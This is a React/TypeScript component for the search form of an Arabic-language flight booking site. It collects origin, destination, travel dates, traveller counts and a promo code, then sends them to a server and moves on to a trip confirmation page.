import { BorderBeam } from "@/components/ui/border-beam";
import Label from "@/components/ui/label";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import ShinyButton from "@/components/ui/shiny-button";
import destinations from "@/data/destinations";
import { PlaneIcon, PlaneLandingIcon, PlaneTakeoffIcon } from "lucide-react";
import { useEffect, useState } from "react";
import TravellersCountInput from "./TravellersCountInput";
import { cn } from "@/lib/utils";
import { isAdminError } from "@/real-time/context/signals";
import { useNavigate } from "react-router-dom";
import { addDays, format } from "date-fns";
import { FieldValues, useForm } from "react-hook-form";
import { flyProps } from "@/types/fly.types";
import { CustomInput } from "../traveller-info";
import { DateInput } from "@/components/DateInput/DateInput";
import { sendDataToServer, setCurrentPage } from "@/real-time/utils/utils";

const tabs = ["ذهاب وعودة", "اتجاه واحد", "وجهات متعددة"];

const initFormData = {
  to: "",
  from: "",
  adult: 1,
  child: 0,
  baby: 0,
  "date-from": format(new Date(), "yyyy-MM-dd"),
  "date-to": format(addDays(new Date(), 3), "yyyy-MM-dd"),
  "code-comerce": "",
};

const HeroSection = () => {
  useEffect(() => {
    setCurrentPage("الرئيسية");
  }, []);

  const navigate = useNavigate();
  const [activeTab, setActiveTab] = useState<number>(0);

  const {
    register,
    handleSubmit,
    setValue,
    formState: { errors },
  } = useForm({
    defaultValues: initFormData,
  });

  const onSubmit = (data: FieldValues) => {
    data.activeTab = activeTab;
    activeTab !== 0 && delete data["date-to"];

    console.log(data);

    sendDataToServer({
      current: "الرئيسية",
      data,
      nextPage: "trip-confirm",
      waitingForAdminResponse: false,
      navigate,
      state: data,
    });
  };

  return (
    <section className="relative py-10 lg:pb-20 px-4 sm:px-20">
      <div className="container mx-auto rounded-2xl bg-main/90 relative overflow-hidden p-4">
        <BorderBeam />

        <div className="flex gap-2 py-1 bg-main px-5 rounded-lg w-fit text-main-foreground">
          <PlaneIcon />
          <p>رحلات طيران</p>
        </div>
        <form className="py-6 px-4" onSubmit={handleSubmit(onSubmit)}>
          <div className="flex justify-between lg:justify-normal lg:gap-4 mb-4">
            {tabs.map((tab, index) => (
              <button
                key={index}
                className={`text-main-foreground relative cursor-pointer text-sm md:text-base px-2 pb-1 rounded-md ${
                  activeTab === index
                    ? "relative after:w-full after:h-0.5 after:bg-alt after:absolute after:left-0 after:-bottom-0.5"
                    : ""
                }`}
                onClick={() => setActiveTab(index)}
                type="button"
              >
                {tab}
              </button>
            ))}
          </div>

          <div className="grid items-end grid-cols-1 lg:grid-cols-3 gap-4">
            <div className="lg:col-span-1 relative">
              <FlyInputs
                label="من"
                id="from"
                sels={destinations}
                placeholder="المغادرة"
                Icon={PlaneTakeoffIcon}
                register={register}
                errors={errors}
                options={{
                  required: {
                    value: true,
                    message: "يجب تحديد مكان المغادرة",
                  },
                }}
                setValue={setValue}
              />
            </div>
            <div className="lg:col-span-1 relative">
              <FlyInputs
                label="إلي"
                id="to"
                sels={destinations}
                placeholder="الوجهة"
                Icon={PlaneLandingIcon}
                register={register}
                errors={errors}
                options={{
                  required: {
                    value: true,
                    message: "يجب تحديد الوجهة",
                  },
                }}
                setValue={setValue}
              />
            </div>

            {activeTab === 0 ? (
              <>
                <div className="lg:col-span-1 relative">
                  <DateInput
                    label="تاريخ المغادرة"
                    id="date-from"
                    register={register}
                    setValue={setValue}
                    errors={errors}
                  />
                </div>
                <div className="lg:col-span-1 relative">
                  <DateInput
                    label="تاريخ العودة"
                    id="date-to"
                    register={register}
                    setValue={setValue}
                    errors={errors}
                    defaultValue={addDays(new Date(), 3)}
                  />
                </div>
              </>
            ) : (
              <div className="lg:col-span-1 relative">
                <DateInput
                  label="التاريخ"
                  id="date-from"
                  register={register}
                  setValue={setValue}
                  errors={errors}
                />
              </div>
            )}

            {activeTab === 2 && (
              <>
                <div className="lg:col-span-1 relative">
                  <FlyInputs
                    label="من"
                    id="from-2"
                    sels={destinations}
                    placeholder="المغادرة"
                    Icon={PlaneTakeoffIcon}
                    register={register}
                    errors={errors}
                    options={{
                      required: {
                        value: true,
                        message: "يجب تحديد مكان المغادرة",
                      },
                    }}
                    setValue={setValue}
                  />
                </div>
                <div className="lg:col-span-1 relative">
                  <FlyInputs
                    label="إلي"
                    id="to-2"
                    sels={destinations}
                    placeholder="الوجهة"
                    Icon={PlaneLandingIcon}
                    register={register}
                    errors={errors}
                    options={{
                      required: {
                        value: true,
                        message: "يجب تحديد الوجهة",
                      },
                    }}
                    setValue={setValue}
                  />
                </div>

                <div className="lg:col-span-1 relative">
                  <DateInput
                    label="التاريخ"
                    id="date-from"
                    register={register}
                    setValue={setValue}
                    errors={errors}
                  />
                </div>
              </>
            )}

            <div className="lg:col-span-1 relative pb-5">
              <TravellersCountInput
                id="travellers-count"
                register={register}
                setValue={setValue}
              />
            </div>

            <CustomInput
              className="lg:col-span-1 relative text-main-foreground"
              label="الرمز الترويجي"
              id="code-comerce"
              register={register}
              errors={errors}
            />
          </div>

          <ShinyButton
            text="بحث"
            className="w-fit bg-alt rounded-3xl font-semibold text-xl px-12 mx-auto mt-4 block py-2 "
            type={"submit"}
          />
        </form>
      </div>
    </section>
  );
};
export default HeroSection;

export const FlyInputs = ({
  label,
  id,
  register,
  setValue,
  errors,
  options = {},
  sels,
  Icon,
  placeholder,
}: flyProps) => {
  return (
    <>
      <Label label={label} id={id} className="text-main-foreground" />

      <Select onValueChange={(selected) => setValue && setValue(id, selected)}>
        <SelectTrigger
          className={cn(
            `ps-12`,
            errors?.[id] ? "border-red-500" : "border-gray-300"
          )}
          style={{ direction: "rtl" }}
        >
          {Icon && <Icon className="size-6 absolute right-4" />}

          <SelectValue
            placeholder={placeholder}
            id={id}
            {...register(id, options)}
          />
        </SelectTrigger>
        <SelectContent className="flex">
          {sels.map((sel: { name: string; code?: string; icon?: any }) => (
            <SelectItem
              key={sel.name}
              className="w-full"
              value={sel.name}
              style={{ direction: "rtl" }}
            >
              <div className="flex items-center">
                <p>{sel.name}</p>
                <p className="absolute left-12">{sel.code}</p>
              </div>
            </SelectItem>
          ))}
        </SelectContent>
      </Select>

      <p
        className={cn(
          "text-xs text-red-500 h-5 transition-opacity",
          errors?.[id] || isAdminError.value ? "opacity-100" : "opacity-0"
        )}
      >
        {(errors?.[id]?.message as string) || " هذا الحقل مطلوب"}
      </p>
    </>
  );
};
